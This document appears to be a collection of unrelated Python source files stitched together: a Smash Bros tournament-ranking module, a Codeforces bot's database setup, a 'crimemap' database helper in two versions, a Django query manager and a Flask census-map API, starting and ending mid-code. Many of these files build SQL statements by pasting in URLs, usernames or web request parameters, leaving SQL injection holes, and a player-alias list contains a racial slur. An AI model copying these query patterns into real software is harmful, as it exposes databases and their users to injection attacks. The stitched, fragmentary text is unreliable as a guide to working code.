            except Exception as e:
                continue

    if pages:
        for page in pages:
            iterate()
    else:
        while results < 7730:
            iterate()
            results = results + per_page
            page = page + 1

    return brackets

import MELEE_SINGLES_BRACKETS
import WIIU_BRACKETS
import SMASH_5_BRACKETS

DNS = 'ec2-18-218-117-97.us-east-2.compute.amazonaws.com'

TAGS_TO_COALESCE = [['christmasmike', 'thanksgiving mike', 'christmas mike', 'christmas mike xmas', 'christmas mike late', 'halloween mike', 'im 12', 'im12'],
        ['circuits', 'circuits', 'jkelle', 'circuits xmas'],
        ['gamepad', 'sms gamepad'],
        ['remo', 'su remo'],
        ['kuro', 'ss kuro'],
        ['pixlsugr', 'pixlsug', 'pixlsugar'],
        ['b00', 'boo'],
        ['hnic', 'hnic xmas'],
        ['1111', '11 11', 'vuibol'],
        ['qmantra', 'qmantra xmas'],
	['megafox', 'su | megafox'],
	['hakii', 'su l hakii', 'su | hakii', 'su redriot i hakii', 'hih | hakii', 'su | sleepyhakii', 'su|hakii', 'su | hakii $', 'su  redriot i hakii', 'hoh | hakii', 'su| hakii'],                    
	['lucy', 'ttn | lucy'],
        ['moist', 'f9moist', 'kuyamoist'],
	['sassy', 'atx | sassy', 'f9sassy'],
	['crump', 'donald crump', 'captain crump', 'abc | crump'],
	['dragonite', 'datuglynigwhofkurmomin2ndgrade', 'tmg dragonite', 'su dragonite', 'su | dragonite', 'tpwn | dragonite', 'tpwn | dragonite_pr', 'tpwn| dragonite (gnw)', 'atx hoh | dragonite', 'dragonite_pr', 'hoh | dragonite', 'mega dragonite', 'tpwn|dragonite', 'armada | dragonite', 'aes | dragonite'],
	['gallium', 's.e.s punk', 'ses punk'],
	['mt', 'mt_'],
	['wolf', ' wolf'],
	['fx | albert', 'albert'],
	['ul | jf', 'jf', 'ul| jf', 'ul i jf'],
	['take a seat', 'take a \_', 'take a \\_', 'takeaseat', 'take a seat xmas'],
	['bobby big ballz', 'bobby big balls'],
	['prof. cube', 'type r professor cube', 'prof cube', 'professor cube', 'profesor cube', 'cube', 'processorcube', 'prof cube $'],
	['cashoo', 'hoh | cashoo', 'hoh l cashoo', 'cash00'],
	['ul | chandy', 'ul| chandy', 'cnb | chandy', 'chandy'],
	['spankey', 'spanky'],
	['jack the reaper', 'jackthereaper'],
	['xlll', 'xiii'],
	['cheesedud6', '‚Üê/cheesedud6'],
	['kj', 'go! kj', 'go kj'],
	['jtag', 'tgl | jtag', 'sms | jtag', 'sms jtag', 'jtg', 'j tag'],
	['jka', 'tgl | jka'],
	['fcar', 'tgl | fcar'],
	['resident', 'tgl | resident'],
	['minty!', 'tgl | minty!', 'tgl | minty', 'minty'],
	['willow', 'willowette'],
	['messiah', 'maple'],
	['tenni', 'go! tenni'],
	['cruzin', 'sa  cruzin'],
	['christmasmitch', 'mitchell', 'mitchell slan'],
        ['jibs', 'sfu jibs'],
        ['trane', 'irn trane'],
        ['ninjafish', 'sa  ninjafish'],
        ['mufin', 'sfu mufin'],
        ['jowii', 'jo wii'],
        ['gudlucifer', 'good lucifer', 'goodlucifer', 'gudlucifer wolf'],
        ['ehmon', 'tgl ehmon', 'tgl  ehmon', 'ah ehmon', 'sms ehmon', 'sms | ehmon', 'tgl | ehmon', 'ehhhmon'],
        ['pollo loco', 'pollo'],
        ['doombase', 'retiredbase'],
        ['majinmike', 'majin mike'],
        ['karonite', 'red velvet', 'aos redvelvet', 'redvelvet']]

# TODO DO NOT ADD MORE BRACKETS WITHOUT ADDING A CORRESPONDING DISPLAY NAME!!
AUSTIN_URLS = ('austin', {'enumerated': ['http://challonge.com/heatwave###', 'https://challonge.com/NP9ATX###', 'http://challonge.com/hw###', 'https://challonge.com/alibaba###'], 'users': ['https://challonge.com/users/kuya_mark96', 'https://austinsmash4.challonge.com']})                    
SMASHBREWS_RULS = ('smashbrews', {'enumerated': ['https://challonge.com/Smashbrews###', 'https://challonge.com/smashbrewsS3W###', 'https://challonge.com/smashbrewsS4W###', 'https://challonge.com/smashbrewsS5W###']})
COLORADO_SINGLES_URLS = ('colorado', {'enumerated': ['http://smashco.challonge.com/CSUWW###WUS', 'http://smascho.challonge.com/FCWUA###', 'http://smascho.challonge.com/FCWUIB###']})
COLORADO_DOUBLES_URLS = ('colorado_doubles', {'enumerated': ['http://smashco.challonge.com/CSUWW###WUD', 'http://smashco.challonge.com/FCWUDC###']})
COLORADO_URLS = ('colorado_both', {'enumerated': COLORADO_SINGLES_URLS + COLORADO_DOUBLES_URLS})
SMS_URLS = ('sms', {'enumerated': ['http://challonge.com/RAA_###', 'http://challonge.com/SMSH_###'], 'users': ['https://challonge.com/users/yellocake']})                    

DISPLAY_MAP = {'heatwave': 'Heatwave',
        'NP9ATX': 'NP9',
        'challonge.com/hw': 'Heatwave',
        'challonge.com/atx': 'Smashpack',
        'alibaba': 'Alibaba',
        'Mothership': 'Mothership',
        'atxfiles': 'ATX Files',
        'ARFI': 'ARFI',
        'arcadian': 'Arcadian',
        'ooples': 'Ooples',
        'challonge.com/mbh': 'Michaels Big House',
        'challonge.com/sth': 'Smash The Halls',
        'smashbrewsS3': 'Smashbrews S3',
        'smashbrewsS4': 'Smashbrews S4',
        'smashbrewsS5': 'Smashbrews S5',
        'Smashbrews': 'Smashbrews',
        'smashco': 'CSU',
        'smascho': 'CSU',
        'RAA': 'Reading At Alkek'}                    

PRO_MELEE = MELEE_SINGLES_BRACKETS.MELEE_SINGLES        
PRO_WIIU = WIIU_BRACKETS.WII_U_BRACKETS
PRO_SMASH_5 = SMASH_5_BRACKETS.SMASH_5_BRACKETS

SLEEP_TIME = 10 * 60 * 6 #1 hour
TOURNAMENTS_PER_RANK = 20


TEST_URLS = [('test1', ['https://challonge.com/smash_web_test_###']),
        ('test2', ['https://challonge.com/smash_web_scene_two_###'])]

"""
Data structure we need -
dictionary where key is tag_1:
    value is dictionary:
        key for inner dictionary is tag_2, value is a list
        the list has (date_of_set, result)
        one (date, result) for every set they have played
"""


import logger
import datetime
import constants
import get_results
import time
import copy
import player_web
import bracket_utils
from get_ranks import get_ranks
from get_results import get_coalesced_tag, sanitize_tag
import re
from tweet import tweet

LOG = logger.logger(__name__)

class processData(object):
    def __init__(self, db):
        LOG.info('loading constants for process')
        self.db = db

    def process(self, bracket, scene, display_name, new_bracket=False):
        # Before we do anything, check if this url has been analyzed already, and bomb out
        sql = "SELECT * FROM analyzed WHERE base_url = '" + str(bracket) + "';"                    
        result = self.db.exec(sql)                    
        if len(result) > 0:
            LOG.info('tried to analyze {}, but has already been done.'.format(bracket))
            return

        # Send this bracket to get_results
        # We know the bracket is valid if it is from smashgg
        if 'smash.gg' in bracket:
            success = get_results.process(bracket, scene, self.db, display_name)                    
            if success:
                self.insert_placing_data(bracket, new_bracket)                    
            else:
                #TODO add this URL to a table called 'failed_smashgg_brackets' or something
                LOG.exc('Analyzing smashgg tournament {} was not successful'.format(bracket))

        else:
            html, status = bracket_utils.hit_url(bracket)
            if status == 200 and bracket_utils.is_valid(html):
                get_results.process(bracket, scene, self.db, display_name)
                self.insert_placing_data(bracket, new_bracket)                    

    def insert_placing_data(self, bracket, new_bracket):
        LOG.info('we have called insert placing data on bracket {}'.format(bracket))                    
        # Get the html from the 'standings' of this tournament
        tournament_placings = bracket_utils.get_tournament_placings(bracket)

        for player, placing in tournament_placings.items():
            player = sanitize_tag(player)

            # Coalesce tag
            player = get_coalesced_tag(player)
            sql = "INSERT INTO placings (url, player, place) VALUES " \                    
                    + " ('{}', '{}', '{}')".format(bracket, player, placing)                    

            self.db.exec(sql)

            if 'christmasmike' == player and new_bracket:
                if placing < 10:
                    msg = "Congrats on making {} dude! You're the best.".format(placing)
                    tweet(msg)

        LOG.info("tournament placings for {} are {}".format(bracket, tournament_placings))

    def check_and_update_ranks(self, scene):
        # There are 2 cases here:
        #   1) Ranks have never been calculated for this scene before
        #       - This means we need to calculate what the ranks were every month of this scenes history
        #       - We should only do this if ranks don't already exist for this scene
        #   2) Ranks have been calculated for this scene before
        #       - We already have bulk ranks. We should check if it has been more than 1 month since we last
        #           calculated ranks. If so, calculate again with the brackets that have come out this month

        LOG.info('About to check if ranks need updating for {}'.format(scene))
        # First, do we have any ranks for this scene already?
        sql = 'select count(*) from ranks where scene="{}";'.format(scene)                    
        res = self.db.exec(sql)                                        
        count = res[0][0]

        n = 5 if (scene == 'pro' or scene == 'pro_wiiu') else constants.TOURNAMENTS_PER_RANK
        if count == 0:
            LOG.info('Detected that we need to bulk update ranks for {}'.format(scene))
            # Alright, we have nothing. Bulk update ranks
            first_month = bracket_utils.get_first_month(self.db, scene)
            last_month = bracket_utils.get_last_month(self.db, scene)
            
            # Iterate through all tournaments going month by month, and calculate ranks
            months = bracket_utils.iter_months(first_month, last_month, include_first=False, include_last=True)
            for month in months:
                urls, _ = bracket_utils.get_n_tournaments_before_date(self.db, scene, month, n)
                self.process_ranks(scene, urls, month)
        else:

            # Get the date of the last time we calculated ranks
            sql = "select date from ranks where scene='{}' order by date desc limit 1;".format(scene)                    
            res = self.db.exec(sql)                                        
            last_rankings_date = res[0][0]

            # Check to see if it's been more than 1 month since we last calculated ranks
            more_than_one_month = bracket_utils.has_month_passed(last_rankings_date)
            if more_than_one_month:
                # Get only the last n tournaments, so it doesn't take too long to process
                today = datetime.datetime.today().strftime('%Y-%m-%d')
                msg = 'Detected that we need up update monthly ranks for {}, on {}'.format(scene, today)
                LOG.info(msg)

                # We should only ever calculate ranks on the 1st. If today is not the first, log error
                if not today.split('-')[-1] == '1':
                    LOG.exc('We are calculating ranks today, {}, but it isnt the first'.format(today))

                months = bracket_utils.iter_months(last_rankings_date, today, include_first=False, include_last=True)
                for month in months:
                    # Make sure that we actually have matches during this month
                    # Say we are trying to calculate ranks for 2018-05-01, the player would need to have matches during 2018-04-01, 2018-04-30
                    prev_date = bracket_utils.get_previous_month(month)
                    brackets_during_month = bracket_utils.get_tournaments_during_month(self.db, scene, prev_date)

                    if len(brackets_during_month) > 0:
                        tweet('Calculating {} ranks for {}'.format(month, scene))
                        urls, _ = bracket_utils.get_n_tournaments_before_date(self.db, scene, month, n)
                        self.process_ranks(scene, urls, month)

            else:
                LOG.info('It has not yet been 1 month since we calculated ranks for {}. Skipping'.format(scene))


    def process_ranks(self, scene, urls, recent_date):
        PLAYER1 = 0
        PLAYER2 = 1
        WINNER = 2
        DATE = 3
        SCENE = 4

        # make sure if we already have calculated ranks for these players at this time, we do not do it again
        sql = "SELECT * FROM ranks WHERE scene = '{}' AND date='{}';".format(str(scene), recent_date)                    
        res = self.db.exec(sql)                                        
        if len(res) > 0:
            LOG.info('We have already calculated ranks for {} on date {}. SKipping'.format(scene, recent_date))
            return

        matches = bracket_utils.get_matches_from_urls(self.db, urls)
        LOG.info('About to start processing ranks for scene {} on {}'.format(scene, recent_date))

        # Iterate through each match, and build up our dict
        win_loss_dict = {}
        for match in matches:
            p1 = match[PLAYER1]
            p2 = match[PLAYER2]
            winner = match[WINNER]
            date = match[DATE]

            #Add p1 to the dict
            if p1 not in win_loss_dict:
                win_loss_dict[p1] = {}

            if p2 not in win_loss_dict[p1]:
                win_loss_dict[p1][p2] = []

            # Add an entry to represent this match to p1
            win_loss_dict[p1][p2].append((date, winner == p1))

            # add p2 to the dict
            if p2 not in win_loss_dict:
                win_loss_dict[p2] = {}

            if p1 not in win_loss_dict[p2]:
                win_loss_dict[p2][p1] = []

            win_loss_dict[p2][p1].append((date, winner == p2))

        ranks = get_ranks(win_loss_dict)

        tag_rank_map = {}
        for i, x in enumerate(ranks):
            points, player = x
            rank = len(ranks) - i

            sql = "INSERT INTO ranks (scene, player, rank, points, date) VALUES ('{}', '{}', '{}', '{}', '{}');"\                    
                    .format(str(scene), str(player), int(rank), str(points), str(recent_date))                    
            self.db.exec(sql)

            # Only count this player if this is the scene he/she belongs to
            sql = "SELECT scene FROM players WHERE tag='{}';".format(player)                    
            res = self.db.exec(sql)                                        

            if len(res) == 0 or res[0][0] == scene:
                # Also create a list to update the player web
                map = {'rank':rank, 'total_ranked':len(ranks)}
                tag_rank_map[player] = map

        player_web.update_ranks(tag_rank_map)


#!/usr/bin/python3
"""
Python scripte to list items from MySQL
"""

import MySQLdb

from sys import argv


if __name__ == "__main__":
    db = MySQLdb.connect(host="localhost", port=3306, user=argv[1],
                         passwd=argv[2], db=argv[3], charset="utf8")
    c = db.cursor()
    c.execute("SELECT * FROM states WHERE name LIKE %s ORDER BY\
    id ASC",(argv[4],))                    
    for rows in c.fetchall():
        print(rows)

    c.close()
    db.close()

import requests
import sqlite3
import os
from bs4 import BeautifulSoup
available_tags = {'math', "strings", "trees", "graphs", "dp", "greedy", "geometry", "combinatorics"}

def create_cf_base():
    url = 'http://codeforces.com/problemset/'
    r = requests.get(url)
    max_page = 0
    soup = BeautifulSoup(r.text, "lxml")
    base = sqlite3.connect(os.path.abspath(os.path.dirname(__file__)) + "\\cf.db")
    conn = base.cursor()
    conn.execute("create table problems (problem INTEGER, diff CHAR)")
    for i in available_tags:
        conn.execute("create table " + i + " (problems INTEGER, diff CHAR)")                    

    for link in soup.find_all(attrs={"class" : "page-index"}):
        s = link.find('a')
        s2 = s.get("href").split('/')
        max_page = max(max_page, int(s2[3]))

    a = 0
    b = 0
    f = False
    for i in range(1, max_page + 1):
        r = requests.get('http://codeforces.com/problemset/' + '/page/' + str(i))
        soup = BeautifulSoup(r.text, "lxml")
        old = ''
        for link in soup.find_all('a'):
            s = link.get('href')
            if s != None and s.find('/problemset') != -1:
                s = s.split('/')
                if len(s) == 5 and old != s[3] + s[4]:
                    a = s[3]
                    b = s[4]
                    old = s[3] + s[4]
                    if not f:
                        f = True
                        last_update = old
                    conn.execute("insert into problems values (?, ?)", (a, b))
                if len(s) == 4 and s[3] in available_tags:
                    conn.execute("insert into " + s[3] + " values (?, ?)", (a, b))                    

    base.commit()
    base.close()
    settings = sqlite3.connect(os.path.abspath(os.path.dirname(__file__)) + "\\settings.db")
    conn = settings.cursor()
    conn.execute("create table users (chat_id INTEGER, username STRING, last_update STRING, last_problem STRING, state INTEGER)")
    conn.execute("create table last_update_problemset (problem STRING)")
    conn.execute("insert into last_update_problemset values (?)", (last_update, ))
    settings.commit()
    settings.close()


def create_theory_table(): #create EMPTY theory table
    theory = sqlite3.connect(os.path.abspath(os.path.dirname(__file__)) + "\\theory.db")
    conn = theory.cursor()
    for i in available_tags:
        conn.execute("create table " + str(i) + " (link STRING)")                    
    theory.commit()
    theory.close()


path = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'cf.db')
if not os.path.exists(path):
    create_cf_base()

path = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'theory.db')
if not os.path.exists(path):
    create_theory_table()

import requests
import sqlite3
import os

from bs4 import BeautifulSoup
def check_username(username):
    if username == "":
        return True
    if len(username.split()) > 1:
        return True
    r = requests.get('http://codeforces.com/submissions/' + username)
    soup = BeautifulSoup(r.text, "lxml")
    if soup.find(attrs={"class":"verdict"}) == None:
        return True
    return False


def clean_base(username):
    path = os.path.join(os.path.abspath(os.path.dirname(__file__)) + "\\users\\" + username + '.db')
    if os.path.exists(path):
        os.remove(path)

def init_user(username, chat_id):
    conn = sqlite3.connect(os.path.abspath(os.path.dirname(__file__)) + "\\users\\" + username + '.db')
    conn2 = sqlite3.connect(os.path.abspath(os.path.dirname(__file__)) + '\\cf.db')
    cursor = conn.cursor()
    cursor2 = conn2.cursor()
    cursor.execute("CREATE TABLE result (problem INTEGER, diff STRING, verdict STRING)")
    cursor2.execute("SELECT * FROM problems")
    x = cursor2.fetchone()
    while x != None:
        cursor.execute("insert into result values (?, ?, ? )", (x[0], x[1], "NULL"))
        x = cursor2.fetchone()

    url = 'http://codeforces.com/submissions/' + username
    r = requests.get(url)
    max_page = 1
    soup = BeautifulSoup(r.text, "lxml")

    for link in soup.find_all(attrs={"class": "page-index"}):
        s = link.find('a')
        s2 = s.get("href").split('/')
        max_page = max(max_page, int(s2[4]))

    old = ""                    
    r = requests.get('http://codeforces.com/submissions/' + username + '/page/0')
    soup = BeautifulSoup(r.text, "lxml")
    last_try = soup.find(attrs={"class":"status-small"})
    if not last_try == None:
        last_try = str(last_try).split()
        last_try = str(last_try[2]) + str(last_try[3])

    for i in range(1, max_page + 1):
        r = requests.get('http://codeforces.com/submissions/' + username + '/page/' + str(i))
        soup = BeautifulSoup(r.text, "lxml")
        count = 0
        ver = soup.find_all(attrs={"class": "submissionVerdictWrapper"})
        for link in soup.find_all('a'):
            s = link.get('href')
            if s != None and s.find('/problemset') != -1:
                s = s.split('/')
                if len(s) == 5:
                    s2 = str(ver[count]).split()
                    s2 = s2[5].split('\"')
                    count += 1
                    cursor.execute("select * from result where problem = '" + s[3] + "'and diff = '" + s[4] + "'")                    
                    x = cursor.fetchone()
                    if s2[1] == 'OK' and x != None:
                        cursor.execute("update result set verdict = '" + s2[1] + "' where problem = '" + s[3] + "' and diff = '" + s[4] + "'")                    
                    if x != None and x[2] != 'OK':
                        cursor.execute("update result set verdict = '" + s2[1] +"' where problem = '" + s[3] + "' and diff = '" + s[4] + "'")                    

    conn.commit()
    conn.close()
    conn2.close()

    settings = sqlite3.connect(os.path.abspath(os.path.dirname(__file__)) + "\\settings.db")
    conn = settings.cursor()
    conn.execute("select * from last_update_problemset")
    last_problem = conn.fetchone()
    conn.execute("select * from users where chat_id = '" + str(chat_id) + "'")                    
    x = conn.fetchone()
    if x == None:
        conn.execute("insert into users values (?, ?, ?, ?, ?)", (chat_id, username, str(last_try), str(last_problem[0]), 1))
    else:
        conn.execute("update users set username = '" + str(username) + "' where chat_id = '" + str(chat_id) + "'")                    
        conn.execute("update users set last_update = '" + str(last_try) + "' where chat_id = '" + str(chat_id) + "'")                    
        conn.execute("update users set last_problem = '" + str(last_problem[0]) + "' where chat_id = '" + str(chat_id) + "'")                    
        conn.execute("update users set state = '" + str(1) + "' where chat_id = '" + str(chat_id) + "'")                    
    settings.commit()
    settings.close()


import dbconfig
import psycopg2


class DBHelper:
    """docstring for DBHelper."""

    def connect(self, database="crimemap"):
        return psycopg2.connect(host='localhost', dbname=database, user=dbconfig.db_user, password=dbconfig.db_password)

    def get_all_inputs(self):
        connection = self.connect()
        try:
            query = "SELECT description FROM crimes;"
            with connection.cursor() as cursor:
                cursor.execute(query)                    
                return cursor.fetchall()
        finally:
            connection.close()

    def add_input(self, data):
        connection = self.connect()
        try:
            query = "INSERT INTO crimes (description) VALUES ('{}');".format(data)                    
            with connection.cursor() as cursor:
                cursor.execute(query)                    
                connection.commit()
        finally:
            connection.close()

    def clear_all(self):
        connection = self.connect()
        try:
            query = "DELETE FROM crimes;"
            with connection.cursor() as cursor:
                cursor.execute(query)                    
                connection.commit()
        finally:
            connection.close()

import dbconfig
import psycopg2


class DBHelper:
    """docstring for DBHelper."""

    def connect(self, database="crimemap"):
        return psycopg2.connect(host='localhost', dbname=database, user=dbconfig.db_user, password=dbconfig.db_password)

    def get_all_inputs(self):
        connection = self.connect()
        try:
            query = "SELECT description FROM crimes;"
            with connection.cursor() as cursor:
                cursor.execute(query)
                return cursor.fetchall()
        finally:                    
            connection.close()                    

    def add_input(self, data):
        connection = self.connect()
        try:
            query = "INSERT INTO crimes (description) VALUES (%s);"                    
            with connection.cursor() as cursor:
                cursor.execute(query, data)                    
                connection.commit()                    
        finally:                    
            connection.close()                    

    def clear_all(self):
        connection = self.connect()
        try:
            query = "DELETE FROM crimes;"
            with connection.cursor() as cursor:
                cursor.execute(query)
                connection.commit()                    
        finally:                    
            connection.close()                    

import sys
import logging

from django.db import connection, DatabaseError
from reviewus.settings import DEBUG

logger = logging.getLogger(__name__)


class DBConnection:
  instance = None
  con = None

  def __new__(cls):
    if DBConnection.instance is None:
      DBConnection.instance = object.__new__(cls)
    return DBConnection.instance

  def __init__(self):
    if DBConnection.con is None:
      try:
        DBConnection.con = connection.cursor()
        logger.info('################## Database connection opened.')
      except DatabaseError as db_error:
        logger.error("################## Erreur :\n{0}".format(db_error))

  def __del__(self):
    if DBConnection.con is not None:
      DBConnection.con.close()
      logger.info('################## Database connection closed.')


"""
@author joonas
"""
class DBManager:
  # instance = DBConnection()

  @staticmethod
  def conn():
    try:
      # return DBManager.instance.con # This for singleton, but has error yet
      return connection.cursor()
    except:
      return DBManager.error_handle()

  @staticmethod
  def execute(sql, cursor=False):
    _cursor = DBManager.conn()
    try:
      result = _cursor.execute(sql)                    
      if cursor:
        return _cursor
      return result
    except:
      return DBManager.error_handle()

  @staticmethod
  def execute_and_fetch(sql, as_row=False):
    try:
      cursor = DBManager.execute(sql, cursor=True)                    
      result = cursor.fetchone()
      if as_row:
        return DBManager.as_row(cursor, result)
      return result
    except:
      return DBManager.error_handle()

  @staticmethod
  def execute_and_fetch_all(sql, as_list=False):
    try:
      cursor = DBManager.execute(sql, cursor=True)                    
      result = cursor.fetchall()
      if as_list:
        return DBManager.as_list(cursor, result)
      return result
    except:
      return DBManager.error_handle()

  @staticmethod
  def get_fields(cursor):
    return [col[0] for col in cursor.description]

  @staticmethod
  def as_row(cursor, query_set):
    if cursor is None or query_set is None:
      return dict()

    fields = DBManager.get_fields(cursor)
    return dict(zip(fields, list(query_set)))

  @staticmethod
  def as_list(cursor, query_set):
    if cursor is None or query_set is None:
      return list()

    fields = DBManager.get_fields(cursor)
    results = list(query_set)
    try:
      return [dict(zip(fields, result)) for result in results]
    except:
      return error_handle('Columns are not macthed')


  def error_handle(error=None):
    if error is None:
      error = sys.exc_info()[0]

    if DEBUG:
      logger.error(error)

    try:
      return error
    except:
      return 'Unexpected error'





import ast
import json
# import math
# import os
import psycopg2
# import sys
import utils

from datetime import datetime

from contextlib import contextmanager

from flask import Flask
from flask import render_template
from flask import request
from flask import Response
from flask_compress import Compress

from psycopg2 import extras
from psycopg2.pool import ThreadedConnectionPool

app = Flask(__name__, static_url_path='')
Compress(app)

# set command line arguments
args = utils.set_arguments()

# get settings from arguments
settings = utils.get_settings(args)

# create database connection pool
pool = ThreadedConnectionPool(10, 30,
                              database=settings["pg_db"],
                              user=settings["pg_user"],
                              password=settings["pg_password"],
                              host=settings["pg_host"],
                              port=settings["pg_port"])


@contextmanager
def get_db_connection():
    """
    psycopg2 connection context manager.
    Fetch a connection from the connection pool and release it.
    """
    try:
        connection = pool.getconn()
        yield connection
    finally:
        pool.putconn(connection)


@contextmanager
def get_db_cursor(commit=False):
    """
    psycopg2 connection.cursor context manager.
    Creates a new cursor and closes it, committing changes if specified.
    """
    with get_db_connection() as connection:
        cursor = connection.cursor(cursor_factory=psycopg2.extras.RealDictCursor)
        try:
            yield cursor
            if commit:
                connection.commit()
        finally:
            cursor.close()


@app.route("/")
def homepage():
    return render_template('index.html')


@app.route("/get-bdy-names")
def get_boundary_name():
    # Get parameters from querystring
    min = int(request.args.get('min'))
    max = int(request.args.get('max'))

    boundary_zoom_dict = dict()

    for zoom_level in range(min, max + 1):
        boundary_zoom_dict["{0}".format(zoom_level)] = utils.get_boundary_name(zoom_level)

    return Response(json.dumps(boundary_zoom_dict), mimetype='application/json')


@app.route("/get-metadata")
def get_metadata():
    full_start_time = datetime.now()
    start_time = datetime.now()

    # Get parameters from querystring
    num_classes = int(request.args.get('n'))
    raw_stats = request.args.get('stats')

    # replace all maths operators to get list of all the stats we need
    search_stats = raw_stats.upper().replace(" ", "").replace("(", "").replace(")", "") \
        .replace("+", ",").replace("-", ",").replace("/", ",").replace("*", ",").split(",")

    # TODO: add support for numbers in equations - need to strip them from search_stats list

    # equation_stats = raw_stats.lower().split(",")

    # print(equation_stats)
    # print(search_stats)

    # get stats tuple for query input (convert to lower case)
    search_stats_tuple = tuple([stat.lower() for stat in search_stats])

    # get all boundary names in all zoom levels
    boundary_names = list()

    for zoom_level in range(0, 16):
        bdy_name = utils.get_boundary_name(zoom_level)

        if bdy_name not in boundary_names:
            boundary_names.append(bdy_name)

    # get stats metadata, including the all important table number and map type (raw values based or normalised by pop)
    sql = "SELECT lower(sequential_id) AS id, " \
          "lower(table_number) AS \"table\", " \
          "replace(long_id, '_', ' ') AS description, " \
          "column_heading_description AS type, " \
          "CASE WHEN lower(long_id) LIKE '%%median%%' OR lower(long_id) LIKE '%%average%%' THEN 'values' " \
          "ELSE 'normalised' END AS maptype " \
          "FROM {0}.metadata_stats " \
          "WHERE lower(sequential_id) IN %s " \
          "ORDER BY sequential_id".format(settings["data_schema"], )

    with get_db_cursor() as pg_cur:
        try:
            pg_cur.execute(sql, (search_stats_tuple,))
        except psycopg2.Error:
            return "I can't SELECT :\n\n" + sql

        # Retrieve the results of the query
        rows = pg_cur.fetchall()

    # output is the main content, row_output is the content from each record returned
    response_dict = dict()
    response_dict["type"] = "StatsCollection"
    response_dict["classes"] = num_classes

    output_array = list()                    

    # get metadata for all boundaries (done in one go for frontend performance)
    for boundary_name in boundary_names:                    
        output_dict = dict()                    
        output_dict["boundary"] = boundary_name                    

        boundary_table = "{0}.{1}".format(settings["web_schema"], boundary_name)                    

        # # get id and area fields for boundary
        # bdy_id_field = ""
        # bdy_area_field = ""

        # for boundary_dict in settings['bdy_table_dicts']:
            # if boundary_dict["boundary"] == boundary_name:
                # bdy_id_field = boundary_dict["id_field"]
                # bdy_area_field = boundary_dict["area_field"]

        i = 0                    
        feature_array = list()                    

        # For each row returned assemble a dictionary
        for row in rows:                    
            feature_dict = dict(row)                    
            feature_dict["id"] = feature_dict["id"].lower()                    
            feature_dict["table"] = feature_dict["table"].lower()                    

            data_table = "{0}.{1}_{2}".format(settings["data_schema"], boundary_name, feature_dict["table"])

            # get the values for the map classes
            with get_db_cursor() as pg_cur:
                stat_field = "CASE WHEN bdy.population > 0 THEN tab.{0} / bdy.population * 100.0 ELSE 0 END" \
                    .format(feature_dict["id"], )
                feature_dict["classes"] = utils.get_equal_interval_bins(data_table, boundary_table, stat_field, pg_cur, settings)                    

                # add dict to output array of metadata
                feature_array.append(feature_dict)                    

            i += 1                    

        output_dict["stats"] = feature_array                    
        output_array.append(output_dict)                    

        print("Got metadata for {0} in {1}".format(boundary_name, datetime.now() - start_time))                    

    # Assemble the JSON
    response_dict["boundaries"] = output_array                    

    print("Returned metadata in {0}".format(datetime.now() - full_start_time))

    return Response(json.dumps(response_dict), mimetype='application/json')


# def get_bins(boundary_name, feature_dict, num_classes, stat_field, bdy_id_field):
#     value_dict = dict()
#
#     # kmeans cluster data to get the best set of classes
#     # (uses a nice idea from Alex Ignatov to use a value as a coordinate in the PostGIS ST_ClusterKMeans function!)
#     data_table = "{0}.{1}_{2}".format(settings["data_schema"], boundary_name, feature_dict["table"])
#     # bdy_table = "{0}.{1}_{2}_aust".format(settings["boundary_schema"], boundary_name, settings["census_year"])
#     bdy_table = "{0}.{1}".format(settings["web_schema"], boundary_name)
#
#     sql = "WITH sub AS (" \
#           "WITH points AS (" \
#           "SELECT {0} as val, ST_MakePoint({0}, 0) AS pnt FROM {1} AS tab " \
#           "INNER JOIN {2} AS bdy ON tab.{3} = bdy.id) " \
#           "SELECT val, ST_ClusterKMeans(pnt, {5}) OVER () AS cluster_id FROM points) " \
#           "SELECT MAX(val) AS val FROM sub GROUP BY cluster_id ORDER BY val" \
#         .format(stat_field, data_table, bdy_table, settings['region_id_field'], bdy_id_field, num_classes)
#
#     # print(sql)
#
#     with get_db_cursor() as pg_cur:
#         pg_cur.execute(sql)                    
#         rows = pg_cur.fetchall()
#
#         j = 0
#
#         for row in rows:                    
#             value_dict["{0}".format(j)] = row["val"]
#             j += 1
#
#     # # get max values
#     # sql = "SELECT MAX({0}) AS val FROM {1}.{2}_{3} AS tab " \
#     #       "INNER JOIN {4}.{2}_zoom_10 AS bdy ON tab.{5} = bdy.id " \
#     #       "WHERE geom IS NOT NULL" \
#     #     .format(stat_field, settings["data_schema"], boundary_name, feature_dict["table"],
#     #             settings["boundary_schema"] + "_display", settings['region_id_field'])
#     #
#     # with get_db_cursor() as pg_cur:
#     #     pg_cur.execute(sql)                    
#     #     row = pg_cur.fetchone()
#     #     max_value = row["val"]
#     #
#     # increment = max_value / float(num_classes)
#     #
#     # for j in range(0, num_classes):
#     #     value_dict["{0}".format(j)] = increment * float(j + 1)
#
#     return value_dict


@app.route("/get-data")
def get_data():
    full_start_time = datetime.now()
    start_time = datetime.now()

    # Get parameters from querystring

    map_left = request.args.get('ml')
    map_bottom = request.args.get('mb')
    map_right = request.args.get('mr')
    map_top = request.args.get('mt')

    stat_id = request.args.get('s')
    table_id = request.args.get('t')
    boundary_name = request.args.get('b')
    zoom_level = int(request.args.get('z'))

    # get the number of decimal places for the output GeoJSON to reduce response size & speed up rendering
    decimal_places = utils.get_decimal_places(zoom_level)                    

    # TODO: add support for equations

    # get the boundary table name from zoom level
    if boundary_name is None:
        boundary_name = utils.get_boundary_name(zoom_level)

    display_zoom = str(zoom_level).zfill(2)

    stat_table_name = boundary_name + "_" + table_id                    

    boundary_table_name = "{0}".format(boundary_name)                    

    with get_db_cursor() as pg_cur:
        print("Connected to database in {0}".format(datetime.now() - start_time))
        start_time = datetime.now()

        envelope_sql = "ST_MakeEnvelope({0}, {1}, {2}, {3}, 4283)".format(map_left, map_bottom, map_right, map_top)                    
        geom_sql = "geojson_{0}".format(display_zoom)                    

        sql = "SELECT bdy.id, bdy.name, bdy.population, tab.{0} / bdy.area AS density, " \                    
              "CASE WHEN bdy.population > 0 THEN tab.{0} / bdy.population * 100.0 ELSE 0 END AS percent, " \                    
              "tab.{0}, {1} AS geometry " \                    
              "FROM {2}.{3} AS bdy " \                    
              "INNER JOIN {4}.{5} AS tab ON bdy.id = tab.{6} " \                    
              "WHERE bdy.geom && {7}" \                    
            .format(stat_id, geom_sql, settings['web_schema'], boundary_table_name, settings['data_schema'],                    
                    stat_table_name, settings['region_id_field'], envelope_sql)                    

        try:
            pg_cur.execute(sql)                    
